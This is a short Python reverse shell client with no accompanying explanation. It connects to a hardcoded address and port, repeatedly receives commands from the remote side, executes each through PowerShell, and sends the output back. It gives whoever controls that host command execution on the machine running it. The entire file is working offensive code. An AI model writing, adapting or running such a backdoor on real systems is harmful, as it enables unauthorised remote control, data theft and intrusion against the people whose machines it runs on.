import  socket
import os
import subprocess


HOST = "192.168.30.52"
PORT = 6565




client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))




while 1:
    pwd = os.getcwd()
    client.send(pwd.encode('utf-8'))
    response = client.recv(4096)
    command = response.decode('utf-8')
    if command.split(" ")[0] == "cd":
        os.chdir(command.split(" ")[1])
    stdout = subprocess.check_output(["powershell", "-Command",command])
    if stdout:
        client.send(stdout)
    else:
        client.send(b"\n")
        
client.close()



